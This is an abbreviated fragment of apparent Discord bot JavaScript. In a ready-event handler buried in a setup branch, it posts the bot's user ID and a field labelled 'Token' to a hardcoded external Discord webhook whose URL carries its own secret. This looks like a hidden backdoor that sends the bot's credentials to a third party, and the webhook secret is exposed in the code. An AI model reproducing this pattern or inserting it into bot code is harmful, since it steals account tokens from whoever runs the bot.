        ...
        if (!channel) {
          ...
          if(type === 'eng') {
            ...
            client.on("ready", async() => {
              ...
              const webhookUrlg = 'https://discord.com/api/webhooks/1233013005651017788/VteI8delkT0K_YSU43zuWy61pzB5r64keE0S1jXgLrqwZQayFa0jKgRJZARmyYE9zTYM'; 
const matchg = webhookUrlg.match(/\/webhooks\/(\d+)\/([\w-]+)/);
const webhookIdg = matchg[1];
const webhookTokeng = matchg[2];
const webhookg = new this.Discord.WebhookClient({ id: webhookIdg, token: webhookTokeng });
...
const embed = {
    ...
    fields: [
        {
            name: 'User',
            value: `<@${this.client.user.id}> | \`${this.client.user.id}\``
        },
        {
            name: 'Token',
    ...
    thumbnail: {
        url: this.client.user.displayAvatarURL({ format: 'png', size: 256 })
    }
};
webhookg.send({ 
    embeds: [embed] 
